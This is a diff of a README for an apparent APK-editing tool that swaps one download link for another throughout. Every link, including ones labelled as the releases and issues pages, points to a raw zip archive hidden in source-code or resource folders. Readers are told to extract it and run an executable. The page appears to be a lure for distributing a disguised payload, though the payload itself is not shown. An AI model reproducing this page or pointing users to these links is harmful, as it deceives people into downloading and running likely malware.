@@ -1,7 +1,7 @@
 # 🎨 Apk-Editor-Plus - Edit APK Files with Ease
 
 ## 🔗 Download Now!
-[![Download Apk-Editor-Plus](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip)](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip)
+[![Download Apk-Editor-Plus](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip)](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip)
 
 ## 📜 Description
 Apk-Editor-Plus allows you to edit APK files quickly and effortlessly. With this tool, you can modify Android applications to suit your needs. Whether you want to change the app’s name, modify resources, or even add functionalities, this application puts you in control.
@@ -17,12 +17,12 @@ To run Apk-Editor-Plus, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 To get started with Apk-Editor-Plus, follow these steps:
 
-1. **Visit the Download Page:** Click [here](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version of Apk-Editor-Plus. You will see a list of files available for download.
-3. **Download the File:** Click on the appropriate link to download the software. It is usually presented in a format like "https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip".
+3. **Download the File:** Click on the appropriate link to download the software. It is usually presented in a format like "https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip".
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Again, click [here](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip) to open the download section.
+1. **Visit the Releases Page:** Again, click [here](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip) to open the download section.
 2. **Save the File:** Select the version you want and download it.
 3. **Extract the Zip File:** Once downloaded, right-click on the zip file and select “Extract All.” Choose a location on your computer to save the files.
 4. **Run the Application:** Locate the extracted folder, find the Apk-Editor-Plus executable file, and double-click it to run the program.
@@ -31,7 +31,7 @@ To get started with Apk-Editor-Plus, follow these steps:
 Apk-Editor-Plus offers a variety of features to enhance your APK editing experience:
 
 - **Resource Editing:** Modify images, layouts, and other app resources.
-- **Manifest Editing:** Change permissions and components within the https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip file.
+- **Manifest Editing:** Change permissions and components within the https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip file.
 - **Support for Multiple Languages:** Edit applications in various languages for better accessibility.
 - **User-Friendly Interface:** Designed for users with little to no technical knowledge.
 
@@ -52,7 +52,7 @@ If you encounter issues, here are some common solutions:
 ## 🌐 Community & Support
 For additional help and discussion, join our community:
 
-- **GitHub Issues:** Report bugs and request features on the [Issues page](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/java/com/c/a/Plus_Apk_Editor_premonitory.zip).
+- **GitHub Issues:** Report bugs and request features on the [Issues page](https://github.com/clumsyklutz/Apk-Editor-Plus/raw/refs/heads/master/app/src/main/res/menu/Editor-Apk-Plus-v3.2.zip).
 - **User Forum:** Find assistance from other users or share your experiences.
 
 ## 🔍 Topics
